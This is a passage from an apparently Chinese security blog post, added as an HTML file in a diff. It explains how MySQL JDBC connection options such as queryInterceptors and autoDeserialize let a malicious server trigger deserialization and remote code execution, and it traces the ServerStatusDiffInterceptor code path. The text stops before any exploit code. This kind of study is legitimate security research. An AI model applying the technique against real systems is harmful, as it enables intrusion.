@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>JDBC-Mysql反序列化 - stoocea&#39;s Blog</title><meta name="author" content="stoocea">
+<meta name="author-link" content="https://github.com/Stoocea">
+<meta name="description" content="Mysql-JDBC反序列化 属于是必学项，但是不知道为什么学的这么晚。不过好歹还是开始了 ‍ Mysql-JDBC反序列化 JDBC基础回顾 先看一" /><meta name="keywords" content='JDBC' />
+  <meta itemprop="name" content="JDBC-Mysql反序列化">
+  <meta itemprop="description" content="Mysql-JDBC反序列化 属于是必学项，但是不知道为什么学的这么晚。不过好歹还是开始了 ‍ Mysql-JDBC反序列化 JDBC基础回顾 先看一">
+  <meta itemprop="datePublished" content="2024-08-08T15:58:26+08:00">
+  <meta itemprop="dateModified" content="2024-08-08T15:58:26+08:00">
+  <meta itemprop="wordCount" content="6739">
+  <meta itemprop="image" content="https://bu.dusays.com/2024/08/04/66af064092887.png">
+  <meta itemprop="keywords" content="JDBC"><meta property="og:url" content="http://localhost:1313/posts/jdbc-mysql%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+  <meta property="og:site_name" content="stoocea&#39;s Blog">
+  <meta property="og:title" content="JDBC-Mysql反序列化">
+  <meta property="og:description" content="Mysql-JDBC反序列化 属于是必学项，但是不知道为什么学的这么晚。不过好歹还是开始了 ‍ Mysql-JDBC反序列化 JDBC基础回顾 先看一">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-08T15:58:26+08:00">
+    <meta property="article:modified_time" content="2024-08-08T15:58:26+08:00">
+    <meta property="article:tag" content="JDBC">
+    <meta property="og:image" content="https://bu.dusays.com/2024/08/04/66af064092887.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://bu.dusays.com/2024/08/04/66af064092887.png">
+  <meta name="twitter:title" content="JDBC-Mysql反序列化">
+  <meta name="twitter:description" content="Mysql-JDBC反序列化 属于是必学项，但是不知道为什么学的这么晚。不过好歹还是开始了 ‍ Mysql-JDBC反序列化 JDBC基础回顾 先看一">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://localhost:1313/posts/jdbc-mysql%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" /><link rel="prev" href="http://localhost:1313/posts/memshell%E5%86%8D%E7%A0%94%E7%A9%B6/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "JDBC-Mysql反序列化",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/jdbc-mysql%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/"
+    },"genre": "posts","keywords": "JDBC","wordcount":  6739 ,
+    "url": "http:\/\/localhost:1313\/posts\/jdbc-mysql%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/","datePublished": "2024-08-08T15:58:26+08:00","dateModified": "2024-08-08T15:58:26+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "stoocea"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="stoocea&#39;s Blog"><img loading="lazy" src="https://bu.dusays.com/2024/08/04/66af064092887.png" alt="stoocea&#39;s Blog" data-title="stoocea&#39;s Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">stoocea&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              >文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              >标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              >分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/links/"
+                
+                
+              >友链</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="stoocea&#39;s Blog"><img loading="lazy" src="https://bu.dusays.com/2024/08/04/66af064092887.png" alt="stoocea&#39;s Blog" data-title="stoocea&#39;s Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">stoocea&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                >文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                >标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                >分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/links/"
+                  
+                  
+                >友链</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>JDBC-Mysql反序列化</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="https://github.com/Stoocea" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+    stoocea</a></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/java/" class="post-category" title="分类 - Java"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Java</a></span></div><div class="post-meta-line"><span title="发布于 2024-08-08 15:58:26"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-08">2024-08-08</time></span>&nbsp;<span title="6739 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 6800 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 14 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#jdbc基础回顾">JDBC基础回顾</a></li>
+    <li><a href="#serverstatusdiffinterceptor">ServerStatusDiffInterceptor</a>
+      <ul>
+        <li><a href="#漏洞点探索">漏洞点探索</a></li>
+        <li><a href="#伪造通信流程">伪造通信流程</a></li>
+        <li><a href="#利用总结">利用总结</a></li>
+      </ul>
+    </li>
+    <li><a href="#detectcustomcollations">detectCustomCollations</a>
+      <ul>
+        <li><a href="#漏洞流程解析">漏洞流程解析</a></li>
+        <li><a href="#利用总结-1">利用总结</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h1 id="mysql-jdbc反序列化" class="heading-element"><span>Mysql-JDBC反序列化</span>
+  <a href="#mysql-jdbc%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>属于是必学项，但是不知道为什么学的这么晚。不过好歹还是开始了</p>
+<p>‍</p>
+<h1 id="mysql-jdbc反序列化-1" class="heading-element"><span>Mysql-JDBC反序列化</span>
+  <a href="#mysql-jdbc%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><h2 id="jdbc基础回顾" class="heading-element"><span>JDBC基础回顾</span>
+  <a href="#jdbc%e5%9f%ba%e7%a1%80%e5%9b%9e%e9%a1%be" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>先看一段使用代码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.sql.Connection</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.sql.DriverManager</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.sql.ResultSet</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.sql.Statement</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">JDBCtest</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//加载驱动。注意版本不同，Jdbc驱动的全类名路径就不同 如果是mysql-connector-java 6之后的版本就是我这个路径，如果6以前的版本，就是com.mysql.jdbc.Driver</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">Driver</span><span class="o">=</span><span class="s">&#34;com.mysql.cj.jdbc.Driver&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="n">Driver</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//连接的访问路径 JDBC特定路径</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="o">=</span><span class="s">&#34;jdbc:mysql://localhost:3306/jdbc?characterEncoding=utf8&amp;useSSL=true&amp;serverTimezone=GMT%2B8&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//进行连接</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Connection</span><span class="w"> </span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DriverManager</span><span class="p">.</span><span class="na">getConnection</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="s">&#34;root&#34;</span><span class="p">,</span><span class="s">&#34;123456&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Statement</span><span class="w"> </span><span class="n">statement</span><span class="o">=</span><span class="n">conn</span><span class="p">.</span><span class="na">createStatement</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="c1">//利用conn连接成功后的功能对象，进行SQL语句查询</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ResultSet</span><span class="w"> </span><span class="n">rs</span><span class="o">=</span><span class="n">statement</span><span class="p">.</span><span class="na">executeQuery</span><span class="p">(</span><span class="s">&#34;select * from users&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//循环遍历结果集，之后一一输出</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">while</span><span class="p">(</span><span class="n">rs</span><span class="p">.</span><span class="na">next</span><span class="p">()){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">rs</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&#34;username&#34;</span><span class="p">)</span><span class="o">+</span><span class="s">&#34; : &#34;</span><span class="o">+</span><span class="n">rs</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&#34;password&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></div><p>一般来说这一段正常的SQL查询业务逻辑，我们能够控制的只有executeQuery中的参数，哪里出现的反序列化漏洞呢？</p>
+<p>漏洞描述以及原文是这么说的：</p>
+<blockquote>
+<p>(若攻击者能控制JDBC连接设置项，则可以通过设置其配置指向恶意MySQL服务器触发ObjectInputStream.readObject()，构造反序列化利用链从而造成RCE。<br>
+通过JDBC连接MySQL服务端时，会有几句内置的查询语句需执行，其中两个查询的结果集在MySQL客户端进行处理时会被ObjectInputStream.readObject()进行反序列化处理。如果攻击者可以控制JDBC连接设置项，那么可以通过设置其配置指向恶意MySQL服务触发MySQL JDBC客户端的反序列化漏洞。</p>
+</blockquote>
+<p>总结一下原意就是JDBC在连接Mysql服务端的时候，会有几句内置的语句执行，这几句执行过后查询到的结果会在客户端进行readObject反序列化处理。参数控制在JDBC连接配置项中。可以被利用的查询语句有这两项：SHOW SESSION STATUS ；SHOW COLLATION，这两种会在之后的具体代码跟进中体现</p>
+<p>既然我们能够控制的参数是JDBC连接项，首先先对几个与该漏洞有关的连接项进行分析（<code>com.mysql.cj.conf。PropertyDefinitions</code>​的源码中有详细定义）：</p>
+<ol>
+<li>statementInterceptors：用于指定拦截器在SQL执行中和结果返回之前进行逻辑处理，在8.0之后的版本被queryInterceptors代替</li>
+<li>queryInterceptors,8.0之后替代了statementInterceptors的工作，实际上作用相同</li>
+<li>autoDeserialize：设置之后驱动器才能够自动识别含有BLOB的报文，并且反序列化</li>
+<li>detectCustomCollations：原本的意思是指是否检测服务器上安装的自定义字符集和排序规则，如果该选项为ture，驱动程序会在每次建立连接的时候获取其自定义字符集合排序规则。</li>
+</ol>
+<p>利用点在Interceptors和detectCustomCollations中，我们一个一个来</p>
+<p>‍</p>
+<p>下面的测试依赖版本:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="o">&lt;</span><span class="n">dependencies</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="o">&lt;</span><span class="n">dependency</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="o">&lt;</span><span class="n">groupId</span><span class="o">&gt;</span><span class="n">mysql</span><span class="o">&lt;/</span><span class="n">groupId</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="o">&lt;</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="n">mysql</span><span class="o">-</span><span class="n">connector</span><span class="o">-</span><span class="n">java</span><span class="o">&lt;/</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="o">&lt;</span><span class="n">version</span><span class="o">&gt;</span><span class="n">8</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">12</span><span class="o">&lt;/</span><span class="n">version</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="o">&lt;/</span><span class="n">dependency</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&lt;/</span><span class="n">dependencies</span><span class="o">&gt;</span></span></span></code></pre></div><h2 id="serverstatusdiffinterceptor" class="heading-element"><span>ServerStatusDiffInterceptor</span>
+  <a href="#serverstatusdiffinterceptor" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="漏洞点探索" class="heading-element"><span>漏洞点探索</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e7%82%b9%e6%8e%a2%e7%b4%a2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>漏洞描述上说在连接数据MySQL服务端时，会有几句内置的查询语句需执行，也就是SQL query，一般包含。本身ServerStatusDiffInterceptor属于Interceptor，当我们执行SQL query的时候，就会触发Interceptor的preProcessor的方法。</p>
+<p>最开始跟进DriverManager的getConnection，开始创建ConnectionImpl对象的时候，要根据JDBC启动项的URL中提取出启动项，封装为propertySet。当然还有一些必须要在SQL服务器上执行SQL语句之后获得结果才能设置。调用栈如下。其实整体还是在完成ConnectionImpl的创建。</p>
+<p><img loading="lazy" src="/assets/image-20240806141335-cuba2h6.png" alt="image" srcset="/assets/image-20240806141335-cuba2h6.png?size=small, /assets/image-20240806141335-cuba2h6.png?size=medium 1.5x, /assets/image-20240806141335-cuba2h6.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>具体的话在ConnectionImpl的setAutoCommit方法中，会调用到 SET autocommit等SQL语句的执行。该方法的主要作用是为了将每一个SQL请求当作一个独立的事务自动提交。也就是适用于简单操作。</p>
+<p><img loading="lazy" src="/assets/image-20240806223911-24iwmpw.png" alt="image" srcset="/assets/image-20240806223911-24iwmpw.png?size=small, /assets/image-20240806223911-24iwmpw.png?size=medium 1.5x, /assets/image-20240806223911-24iwmpw.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>之后跟进execSQL，在trycatch块中利用本地协议调用sendQueryString发送SQL请求， 前面的逻辑包括初始化设置以及检测连接状态等等</p>
+<p><img loading="lazy" src="/assets/image-20240806223937-41joe0v.png" alt="image" srcset="/assets/image-20240806223937-41joe0v.png?size=small, /assets/image-20240806223937-41joe0v.png?size=medium 1.5x, /assets/image-20240806223937-41joe0v.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>sendQueryString中的内容也只是根据此时的set autocommit等请求参数封装一下请求，后续跟进sendQueryPacket方法，发现调用了invokeQueryInterceptorPre，也就是ServerStatusDiffInterceptor的preProcess方法</p>
+<p><img loading="lazy" src="/assets/image-20240806224036-7lua189.png" alt="image" srcset="/assets/image-20240806224036-7lua189.png?size=small, /assets/image-20240806224036-7lua189.png?size=medium 1.5x, /assets/image-20240806224036-7lua189.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>经过两次跟进（因为有一层NoSubInterceptorWrapper的封装）到ServerStatusDiffInterceptor的preProcess方法</p>
+<p><img loading="lazy" src="/assets/image-20240806224102-vjmqh5b.png" alt="image" srcset="/assets/image-20240806224102-vjmqh5b.png?size=small, /assets/image-20240806224102-vjmqh5b.png?size=medium 1.5x, /assets/image-20240806224102-vjmqh5b.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>之后跟进populateMapWithSessionStatusValues的内容就是重头戏了，前面理解一下思路和为什么这么调就好。</p>
+<p>这里的this.connection其实就是封装的ConnectionImpl，所以执行SQL的必要步骤还是一样&ndash;获取一个statement对象，然后去executeSQL语句，用结果集接收之后，调用resultSetToMap，将结果集进行map键值对处理</p>
